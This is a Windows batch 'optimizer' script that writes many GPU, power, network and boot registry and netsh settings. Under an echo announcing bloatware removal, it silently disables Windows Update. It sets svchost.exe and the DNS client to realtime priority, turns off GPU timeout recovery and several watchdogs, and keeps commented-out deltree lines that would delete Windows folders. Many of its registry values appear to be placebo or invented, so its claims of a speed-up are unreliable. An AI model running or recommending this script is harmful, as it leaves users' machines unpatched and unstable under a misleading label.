Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableCoreVoltage" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMNoECCFuseCheck" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableComputeReset" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMOverrideP0Gpc2ClkMaxFreqKHz" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableDx12OnMsHybrid" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableDx12OnOptimus" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableHybridPerfSLI" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMGsyncTswapRdyHi" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "LimitSegmentsTo4GB" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "Disable4GBTAGLimit" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableComputeAsync" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableMClkSlowdown" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMClkSlowDown" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisableKmRenderBoost" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisableKmRenderStage" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisableKmRender" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2ReserveVASpaceSizeForNvFBC" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2InvalidatePDEsForReserveVA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2EnableSLI" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2DisableRenderGDI" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2ForceInvalidateAllCpuCache" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2Use64KBPages" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2EnableGdiBroadcast" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2EnableSLILinkMirroredWAR" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2OSDualPteSupported" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2DisableSlowCePagingWar" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2ReplaceKindAtTransferVirtual" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2DisableBasicPrimeForGPUVA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2DisableSLIVirtualChannels" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2EnableFermiWDDMv2" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2ForceEngineResetForPageFault" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "WDDMv2KmdHighAddrReserve" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CustomizeDuringSetup" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HiberFileSizePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MfBufferingThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "PerfCalculateActualUtilization" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "TimerRebaseThresholdOnDripsExit" /t REG_DWORD /d "60" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EnergyEstimationDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabledDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatencyCheckEnabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Latency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceFSVP" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyTolerancePerfOverride" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceScreenOffIR" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceVSyncEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "RtlCapabilityCheckLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "QosManagesIdleProcessors" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DisableVsyncLatencyUpdate" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DisableSensorWatchdog" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InterruptSteeringDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LowLatencyScalingPercentage" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighestPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MinimumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaxIAverageGraphicsLatencyInOneBucket" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MiracastPerfTrackGraphicsLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MonitorLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "TransitionLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EnergyEstimationEnabled" /t REG_DWORD /d "0" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "SleepReliabilityDetailedDiagnostics" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EventProcessorEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Class1InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "SleepStudyDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceIdleResiliency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DisableWriteCombining" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EnableRuntimePowerManagement" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LOWLATENCY" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Node3DLowLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "PowerActionResumingWatchdogTimeout" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "PowerActionTransitioningWatchdogTimeout" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "PowerSavingTweaks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "SourceSettingsVersion" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "TdrLevel" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "UseGpuTimer" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DirectedDripsOverride" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "BootHeteroPolicyOverride" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MfOverridesDisabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyActivelyUsed" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyIdleLongTime" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyIdleMonitorOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyIdleNoContext" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyIdleShortTime" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultD3TransitionLatencyIdleVeryLongTime" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceIdle0" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceIdle0MonitorOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceIdle1" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceIdle1MonitorOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceMemory" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceNoContext" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceNoContextMonitorOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceOther" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultLatencyToleranceTimerPeriod" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultMemoryRefreshLatencyToleranceActivelyUsed" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultMemoryRefreshLatencyToleranceMonitorOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DefaultMemoryRefreshLatencyToleranceNoContext" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "PerfEnergyPreference" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMinCores" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMaxCores" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMinCores1" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMaxCores1" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CpLatencyHintUnpark1" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPDistribution" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CpLatencyHintUnpark" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "MaxPerformance1" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "MaxPerformance" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPDistribution1" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPHEADROOM" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPCONCURRENCY" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPIncreaseTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\audiodg.exe" /v "UseLargePages" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe" /v "UseLargePages" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dllhost.exe" /v "UseLargePages" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dwm.exe" /v "UseLargePages" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v "UseLargePages" /t REG_DWORD /d "1" /f
cls
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsm.exe" /v "UseLargePages" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ntoskrnl.exe" /v "UseLargePages" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rundll32.exe" /v "UseLargePages" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\services.exe" /v "UseLargePages" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\smss.exe" /v "UseLargePages" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe" /v "UseLargePages" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskeng.exe" /v "UseLargePages" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v "UseLargePages" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe" /v "UseLargePages" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v "UseLargePages" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PowerMizerEnable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PerfLevelSrc" /t REG_DWORD /d "8738" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PowerMizerLevelAC" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PowerSaverHsyncOn" /t REG_DWORD /d "0" /f

REM Disable TCP/IP Heuristics
netsh int tcp set heuristics disabled
cls
REM Disable TCP/IP timestamps
netsh int tcp set global timestamps=disabled
cls
REM Enable TCP Fast Open
netsh int tcp set global fastopen=enabled
cls
REM Disable Non-SACK Rtt Resiliency
netsh Int tcp set global nonsackrttresiliency=disabled
cls
REM Enable NetDMA
netsh Int tcp set global netdma=enabled
cls
REM Set Congestion Provider to CTCP
netsh Int tcp set global congestionprovider=ctcp
cls
REM Enable DCA (Data Center Awareness)
netsh Int tcp set global dca=enabled
cls
REM Disable TCP/IP autotuning
netsh int tcp set global autotuninglevel=disabled
cls
REM Enable ECN (Explicit Congestion Notification) Capability
netsh int tcp set global ecncapability=enabled
cls
REM Enable RSS (Receive Side Scaling)
netsh int tcp set global rss=enabled
cls
REM Enable TCP chimney offload
netsh int tcp set global chimney=enabled
cls
REM Set MTU (Maximum Transmission Unit) for the "Ethernet" interface
netsh interface ipv4 set subinterface "Ethernet" mtu=1500 store=persistent
cls
REM Set dynamic port range for TCP
netsh int ipv4 set dynamicportrange protocol=tcp start=1025 num=64511
cls
REM Set Default Current Hop Limit to 255
netsh Int ipv4 set glob defaultcurhoplimit=255
cls
REM Set maximum SYN retransmission attempts to 2
netsh Int tcp set global maxsynretransmissions=2
cls
REM Set initial RTO (Retransmission TimeOut) to 2000 ms
netsh int tcp set global initialRto=2000
cls
REM Set process priority to "High" for specific processes
wmic process where name="mqsvc.exe" CALL setpriority "high priority"
wmic process where name="mqtgsvc.exe" CALL setpriority "high priority"
wmic process where name="javaw.exe" CALL setpriority "realtime"
wmic process where name="svchost.exe" CALL setpriority "realtime"
cls
REM Start DNS Client service
sc start Dnscache
cls
REM Get the PID (Process ID) of the DNS Client service
for /f "tokens=3" %%a in ('sc queryex "Dnscache" ^| findstr "PID"') do (
    set "pid=%%a"
)
cls
REM Set process priority to "Realtime" for the DNS Client service
wmic process where ProcessId^=%pid% CALL setpriority "realtime"
cls
cls
REM deltree /y c:\windows\tempor~1
REM deltree /y c:\windows\temp
REM deltree /y c:\windows\tmp
REM deltree /y c:\windows\ff*.tmp
REM deltree /y c:\windows\history
REM deltree /y c:\windows\cookies
REM deltree /y c:\windows\recent
REM deltree /y c:\windows\spool\printers


cls
::NETWORK TWEAKS
REG ADD "HKLM\SYSTEM\CurrentControlSet\services\NDIS\Parameters" /v "TrackNblOwner" /t REG_DWORD /d "0" /f
cls
for /f %%a in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}" /v "*SpeedDuplex" /s ^| findstr "HKEY"') do (
    for /f %%i in ('reg query "%%a" /v "*MaxRssProcessors" ^| findstr "HKEY"') do (
        REG ADD "%%i" /v "*MaxRssProcessors" /t REG_SZ /d "2" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*NumRssQueues" ^| findstr "HKEY"') do (
        REG ADD "%%i" /v "*NumRssQueues" /t REG_SZ /d "2" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*ReceiveBuffers" ^| findstr "HKEY"') do (
        REG ADD "%%i" /v "*ReceiveBuffers" /t REG_SZ /d "1024" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*TransmitBuffers" ^| findstr "HKEY"') do (
        REG ADD "%%i" /v "*TransmitBuffers" /t REG_SZ /d "1024" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*AlternateSemaphoreDelay" ^| findstr "HKEY"') do (
        REG ADD "%%i" /v "*AlternateSemaphoreDelay" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*LsoV1IPv4" ^| findstr "HKEY"') do (
        REG ADD "%%i" /v "*LsoV1IPv4" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*DeviceSleepOnDisconnect" ^| findstr "HKEY"') do (
        REG ADD "%%i" /v "*DeviceSleepOnDisconnect" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*EEE" ^| findstr "HKEY"') do (
        REG ADD "%%i" /v "*EEE" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*FlowControl" ^| findstr "HKEY"') do (
        REG ADD "%%i" /v "*FlowControl" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*IPChecksumOffloadIPv4" ^| findstr "HKEY"') do (
        REG ADD "%%i" /v "*IPChecksumOffloadIPv4" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*TCPChecksumOffloadIPv4" ^| findstr "HKEY"') do (
        REG ADD "%%i" /v "*TCPChecksumOffloadIPv4" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*UDPChecksumOffloadIPv4" ^| findstr "HKEY"') do (
        REG ADD "%%i" /v "*UDPChecksumOffloadIPv4" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*TCPNoDelay" ^| findstr "HKEY"') do (
        REG ADD "%%i" /v "*TCPNoDelay" /t REG_SZ /d "1" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*TaskOffload" ^| findstr "HKEY"') do (
        REG ADD "%%i" /v "*TaskOffload" /t REG_SZ /d "0" /f >nul 2>&1
    )
    for /f %%i in ('reg query "%%a" /v "*RSS" ^| findstr "HKEY"') do (
        REG ADD "%%i" /v "*RSS" /t REG_SZ /d "0" /f >nul 2>&1
    )
)
devmanview /disable "Microsoft Kernel Debug Network Adapter" >nul 2>&1
devmanview /disable "WAN Miniport (IKEv2)" >nul 2>&1
devmanview /disable "WAN Miniport (IP)" >nul 2>&1
devmanview /disable "WAN Miniport (IPv6)" >nul 2>&1
devmanview /disable "WAN Miniport (L2TP)" >nul 2>&1
devmanview /disable "WAN Miniport (Network Monitor)" >nul 2>&1
devmanview /disable "WAN Miniport (PPPOE)" >nul 2>&1
devmanview /disable "WAN Miniport (PPTP)" >nul 2>&1
devmanview /disable "WAN Miniport (SSTP)" >nul 2>&1
devmanview /disable "Microsoft ISATAP Adapter" >nul 2>&1

:: Disable Nagle's Algorithm
for /f %%i in ('wmic path win32_networkadapter get GUID^| findstr "{"') do (
            reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%i" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f
            reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%i" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f
            reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%i" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
        ) >nul 2>&1


REM Enable use of the platform's tick timer
bcdedit /set useplatformtick yes

REM Disable dynamic ticking
bcdedit /set disabledynamictick yes

REM Delete the useplatformclock value
bcdedit /deletevalue useplatformclock

echo This is a powerful bloat remover once you enter any key lot's of windows basic progams will go fast.
cls

cls
echo === Bloatware Removal Upcoming ===
echo.

echo Completed...
sc config wuauserv start= disabled
echo.








































cls






















echo Please Wait.


REM Set all IoLatencyCaps to 0
FOR /F "eol=E" %%a in ('REG QUERY "HKLM\SYSTEM\CurrentControlSet\Services" /S /F "IoLatencyCap"^| FINDSTR /V "IoLatencyCap"') DO (
	REG ADD "%%a" /F /V "IoLatencyCap" /T REG_DWORD /d 0 >NUL 2>&1

	FOR /F "tokens=*" %%z IN ("%%a") DO (
		SET STR=%%z
		SET STR=!STR:HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\=!
		SET STR=!STR:\Parameters=!
		ECHO Setting IoLatencyCap to 0 in !STR!
	)
)
echo We almost done homie!
cls

cls
:: GPU Optimizations ; Credits to Melody
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "CreateGdiPrimaryOnSlaveGPU" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "DriverSupportsCddDwmInterop" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "DxgkCddSyncDxAccess" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "DxgkCddSyncGPUAccess" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "DxgkCddWaitForVerticalBlankEvent" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "DxgkCreateSwapChain" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "DxgkFreeGpuVirtualAddress" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "DxgkOpenSwapChain" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "DxgkShareSwapChainObject" /t REG_DWORD /d "1" /f
